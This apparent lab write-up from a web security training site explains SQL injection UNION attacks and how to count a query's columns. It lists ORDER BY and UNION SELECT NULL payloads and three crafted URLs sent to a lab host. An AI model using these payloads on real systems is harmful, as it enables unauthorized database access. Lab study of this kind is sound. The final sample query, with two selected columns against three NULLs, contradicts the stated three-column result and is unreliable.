# Lab: SQL injection UNION attack, determining the number of columns returned by the query
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

## UNION attack
For a UNION query to work, two key requirements must be met:
- **The individual queries must return the same number of columns.**
- **The data types in each column must be compatible between the individual queries.**

To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

## Solution
According to the description we have to determine the number of the columns of the query. For this we have to approaches. First, using `ORDER BY`:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
This gives an error if the index of the column (1, 2, 3, ...) is out of bound.

The second one is to use `UNION SELECT NULL`:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
This joins the the queried table with a null column, which is possible since the NULL data type is compatible to every commonly used data type (MySQL). It throws an error if we have not the same amount of null columns as columns of the queried table.

The challenge description tells us to use the `NULL` approach. So we extend the URL as follows:
```
https://0a9700d9042e67f88084f38800ed00d2.web-security-academy.net/filter?category=Accessories%27+union+select+null+--+
```
Gives back an 'Internal Server Error'.

```
https://0a9700d9042e67f88084f38800ed00d2.web-security-academy.net/filter?category=Accessories%27+union+select+null,null+--+
```
Answers aswell with an 'Internal Server Error'.

```
https://0a9700d9042e67f88084f38800ed00d2.web-security-academy.net/filter?category=Accessories%27+union+select+null,null,null+--+
```
This will finally give a valid output in form of showing entries. So the amount of columns is three. With this information the lab is solved. The associated SQL query looks probably like this
```sql
SELECT name, description FROM products WHERE category = 'Accessories' UNION SELECT NULL,NULL,NULL -- 
```
